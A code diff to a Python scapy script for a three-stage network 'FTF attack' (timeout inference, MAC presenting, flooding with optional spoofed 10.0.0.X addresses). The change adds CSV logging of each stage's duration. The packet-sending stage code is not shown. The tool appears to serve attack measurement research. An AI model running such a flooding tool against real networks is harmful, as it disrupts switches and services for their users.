@@ -10,7 +10,13 @@ from scapy.all import sendp
 
 from ftf_utils import FTFUtils
 
-# TODO: Duration per stage on CSV
+def log_stage(path, stage, name, t0, t1, detail=""):
+    new = not os.path.exists(path)
+    with open(path, "a", newline="") as f:
+        w = csv.writer(f)
+        if new:
+            w.writerow(["stage", "name", "ts_start", "ts_end", "duration_s", "detail"])
+        w.writerow([stage, name, round(t0, 3), round(t1, 3), round(t1 - t0, 2), detail])
 
 def stage_0(dst_ip, n, t_max):
     hard_timeout = FTFUtils.estimate_hard_timeout(dst_ip, n, t_max)
@@ -69,17 +75,15 @@ def main():
     parser.add_argument('--anm', type=int, required=True)
     parser.add_argument('--n', type=int)
     parser.add_argument('--t-max', type=int)
-    parser.add_argument('--local-ip', type=bool, default=False, help="Spoofed IP address in range 10.0.0.X")
     parser.add_argument('--out-file', type=str, default="/tmp/ftf.csv")
+    parser.add_argument('--local-ip', action='store_true', help="Spoofed IP address in range 10.0.0.X")
     args = parser.parse_args()
 
-    sum_t = 0
     print(f"# [STAGE 0] T_idle Inference, timestamp {int(time())}", flush=True)
-    t0 = int(time())
+    t0 = time()
     hard_timeout, attack_frequency = stage_0(args.dst_ip, args.n, args.t_max)
-    t = int(time()) - t0
-    print(f"# [STAGE 0] delta_t={t} sec", flush=True)
-    sum_t += t
+    log_stage(args.out_file, 0, "timeout_inference", t0, time(),
+            f"hard={hard_timeout};idle={attack_frequency}")
 
     not_exists = not os.path.exists(args.out_file)
     with open(args.out_file, "a+", newline="") as f:
@@ -88,22 +92,19 @@ def main():
             writer.writerow(["npacket", "estimated_hard_timeout", "estimated_idle_timeout"])
         writer.writerow([args.npacket, hard_timeout, attack_frequency])
     
-    t0 = int(time())
     print(f"# [STAGE 1] MAC Presenting, timestamp {int(time())}", flush=True)
+    t0 = time()
     macs = stage_1(args.iface, args.npacket, args.anm, attack_frequency, args.local_ip)
-    t = int(time()) - t0
-    print(f"# [STAGE 1] delta_t={t} sec", flush=True)
-    sum_t += t
+    log_stage(args.out_file, 1, "mac_presenting", t0, time(),
+            f"npacket={args.npacket};anm={args.anm}")
 
-    t0 = int(time())
     print(f"# [STAGE 2] Flooding, timestamp {int(time())}", flush=True)
+    t0 = time()
     stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs, args.local_ip)
-    t = int(time()) - t0
-    print(f"# [STAGE 2] delta_t={t} sec", flush=True)
-    sum_t += t
+    log_stage(args.out_file, 2, "flooding", t0, time(),
+            f"npacket={args.npacket};anp={args.anp}")
 
     print(f"[+] FTF attack completed, timestamp {int(time())}", flush=True)
-    print(f"# [FTF attack] delta_t={sum_t} sec", flush=True)
     
 if __name__ == '__main__':
     main()
